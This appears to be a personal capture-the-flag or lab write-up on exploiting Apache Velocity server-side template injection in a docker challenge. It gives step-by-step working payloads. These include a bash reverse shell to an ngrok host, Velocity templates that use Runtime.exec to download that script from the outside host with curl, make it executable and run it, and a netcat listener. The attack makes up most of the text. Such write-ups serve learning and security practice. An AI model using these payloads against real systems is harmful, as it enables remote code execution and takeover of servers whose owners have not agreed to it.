Spawn the docker and below spawn button there is download file option download the resources.

Using velocity ssti:
https://iwconnect.com/apache-velocity-server-side-template-injection/


Attempting to exploit a potential vulnerability using Velocity Template Injection (VTI) in a web application that uses Apache Velocity as its template engine.

![[Pasted image 20240717173812.png]]

Before that start ngrok on any port.


Then make reverse shell using revshellgen as shown below.

![[Pasted image 20240717164830.png]]

then, nano test.sh and paste the below line on test.sh as shown below

```sh
#!/bin/bash

bash -i >& /dev/tcp/0.tcp.in.ngrok.io/14917 0>&1
```

And,
Start python http server on the port used for ngrok.
![[Pasted image 20240717164800.png]]

inject script on text = 
```java
text=#set($s="")
#set($stringClass=$s.getClass())
#set($runtime=$stringClass.forName("java.lang.Runtime").getRuntime())
#set($process=$runtime.exec("curl -o /tmp/test.sh http://0.tcp.in.ngrok.io:14917/test.sh"))
#set($null=$process.waitFor() )
```


Now after this, shell code is transferred to target host. So, we can stop python http server.

And then give executable permission to test.sh.


``` java
text=#set($s="")
#set($stringClass=$s.getClass())
#set($runtime=$stringClass.forName("java.lang.Runtime").getRuntime())
#set($process=$runtime.exec("chmod +x /tmp/test.sh"))
#set($null=$process.waitFor() )
```


Then run netcat on the ngrok port.
```cmd
nc -lnvp 4444
```

then run,
```java
text=#set($s="")
#set($stringClass=$s.getClass())
#set($runtime=$stringClass.forName("java.lang.Runtime").getRuntime())
#set($process=$runtime.exec("/tmp/test.sh"))
#set($null=$process.waitFor() )
```

It will execute the shell code and give access.


![[Pasted image 20240717172255.png]]

Used tools:
Burpsuite, Ngrok, ReverseshellGen, NetCat(nc), Python http server

Method: reverse shell